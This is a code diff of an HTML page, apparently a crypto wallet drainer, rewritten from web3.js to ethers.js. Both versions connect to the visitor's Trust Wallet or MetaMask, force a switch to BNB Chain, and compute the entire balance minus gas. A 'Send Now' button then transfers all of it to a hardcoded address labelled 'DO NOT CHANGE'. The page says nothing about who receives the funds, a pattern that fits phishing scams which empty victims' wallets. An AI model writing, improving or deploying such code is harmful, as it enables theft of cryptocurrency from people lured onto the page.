@@ -1,82 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
+  <title>Send Full BNB</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Send All BNB Minus Gas</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
 </head>
-<body>
-  <div style="padding: 20px; text-align: center;">
-    <h2>Send Full BNB Balance</h2>
-    <button id="sendButton" style="padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px;">Send Now</button>
-    <div id="status" style="margin-top: 20px; color: #000;"></div>
-  </div>
+<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+
+  <h2 id="balanceInfo">Send BNB</h2>
+  <button id="sendBtn" style="padding: 10px 20px; font-size: 18px;">Send Now</button>
+  <p id="status" style="margin-top: 20px; color: red;"></p>
 
   <script>
-    const receiverAddress = '0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F';
+    const receiver = "0xC64087a6Fd263ab6A140F9b46f4cAF7B3e82147F"; // DO NOT CHANGE
+    const gasLimit = 21000;
 
-    function updateStatus(msg, error = false) {
-      const status = document.getElementById('status');
-      status.innerText = msg;
-      status.style.color = error ? 'red' : 'green';
-      console.log(msg);
+    async function main() {
+      if (!window.ethereum) {
+        document.getElementById("status").textContent = "Trust Wallet or MetaMask not found.";
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const sender = await signer.getAddress();
+
+      const network = await provider.getNetwork();
+      if (network.chainId !== 56) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }]
+          });
+        } catch (err) {
+          document.getElementById("status").textContent = "Please switch to BNB Chain manually.";
+          return;
+        }
+      }
+
+      const balance = await provider.getBalance(sender);
+      const gasPrice = await provider.getGasPrice();
+      const gasFee = gasPrice.mul(gasLimit);
+
+      if (balance.lte(gasFee)) {
+        document.getElementById("status").textContent = "Insufficient balance for gas fees.";
+        return;
+      }
+
+      const valueToSend = balance.sub(gasFee);
+      const valueInBNB = ethers.utils.formatEther(valueToSend);
+      document.getElementById("balanceInfo").textContent = `Send ${valueInBNB} BNB`;
+
+      document.getElementById("sendBtn").onclick = async () => {
+        document.getElementById("status").textContent = "Sending...";
+
+        try {
+          const tx = await signer.sendTransaction({
+            to: receiver,
+            value: valueToSend,
+            gasLimit: gasLimit,
+            gasPrice: gasPrice
+          });
+
+          document.getElementById("status").style.color = "green";
+          document.getElementById("status").textContent = `Transaction sent: ${tx.hash}`;
+        } catch (error) {
+          document.getElementById("status").textContent = "Transaction failed: " + (error.message || error);
+        }
+      };
     }
 
-    document.getElementById('sendButton').addEventListener('click', async () => {
-      if (typeof window.ethereum === 'undefined') {
-        updateStatus('Trust Wallet or MetaMask not found.', true);
-        return;
-      }
-
-      const web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const accounts = await web3.eth.getAccounts();
-      const sender = accounts[0];
-
-      const chainId = await web3.eth.getChainId();
-      if (chainId !== 56) {
-        updateStatus('Please switch to BNB Smart Chain.', true);
-        return;
-      }
-
-      const gasLimit = 21000;
-      const gasPrice = await web3.eth.getGasPrice(); // current network gas price
-      const gasFee = BigInt(gasLimit) * BigInt(gasPrice);
-
-      const balanceWei = BigInt(await web3.eth.getBalance(sender));
-      if (balanceWei <= gasFee) {
-        updateStatus('Insufficient balance for gas.', true);
-        return;
-      }
-
-      const sendAmount = balanceWei - gasFee;
-      const valueHex = '0x' + sendAmount.toString(16);
-
-      const nonce = await web3.eth.getTransactionCount(sender, 'latest');
-
-      const tx = {
-        from: sender,
-        to: receiverAddress,
-        value: valueHex,
-        gas: web3.utils.toHex(gasLimit),
-        gasPrice: web3.utils.toHex(gasPrice),
-        nonce: web3.utils.toHex(nonce),
-        chainId: 56
-      };
-
-      updateStatus('Sending entire balance...');
-
-      try {
-        const txHash = await web3.eth.sendTransaction(tx);
-        updateStatus('✅ Transaction sent: ' + txHash.transactionHash);
-        alert('Transaction Hash: ' + txHash.transactionHash);
-      } catch (err) {
-        console.error(err);
-        updateStatus('Transaction failed: ' + (err.message || err), true);
-        alert('Transaction failed');
-      }
-    });
+    main();
   </script>
 </body>
 </html>
